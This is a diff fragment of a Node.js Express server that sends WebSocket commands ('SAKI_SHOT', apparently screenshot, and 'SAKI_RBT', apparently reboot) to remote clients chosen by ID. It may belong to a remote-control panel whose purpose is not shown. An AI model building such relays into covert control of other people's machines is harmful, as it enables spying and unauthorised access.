@@ -364,12 +364,42 @@ app.post('/Dhvanil/:id', (req, res) => {
   const ws = clients[clientId];
 
   if (ws && ws.readyState === WebSocket.OPEN) {
-    ws.send(JSON.stringify({ type: 'SAKI_RBT', message: 'dhvanil client' }));
+    ws.send(JSON.stringify({ type: 'SAKI_SHOT', message: 'dhvanil client' }));
     res.json({ message: `dhvanil command sent to client ${clientId}` });
   } else {
     res.status(404).json({ message: `Client ${clientId} is not connected` });
   }
 });
+
+
+
+
+
+
+
+
+
+app.post('/rbt/:id', (req, res) => {
+  const clientId = req.params.id;
+  const ws = clients[clientId];
+
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({ type: 'SAKI_RBT', message: 'dhvanil client' }));
+    res.json({ message: `RBT command sent to client ${clientId}` });
+  } else {
+    res.status(404).json({ message: `Client ${clientId} is not connected` });
+  }
+});
+
+
+
+
+
+
+
+
+
+
 
 
 app.post('/delete-client/:id', async (req, res) => {
